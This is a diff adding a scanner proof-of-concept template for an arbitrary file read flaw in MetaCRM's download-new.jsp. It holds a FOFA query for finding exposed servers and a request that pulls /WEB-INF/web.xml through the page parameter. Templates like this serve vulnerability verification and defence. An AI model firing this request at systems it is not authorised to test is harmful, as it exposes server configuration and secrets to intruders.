@@ -1,0 +1,16 @@
+id: poc-yaml-metacrm-download-new-jsp-anyfile-read
+info:
+  name: MetaCRM客户关系管理系统 download-new.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+requests:
+- method: GET
+  path: /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"</web-app>\") &&\ncontains(body,\"\
+    <display-name>\") &&\ncontains(body,\"<listener>\") &&\ncontains(headers,\"filename=\\\
+    \"\\\"\") &&\ncontains(content_type,\"application/xml\")\n"
+variables: {}
+transport: http
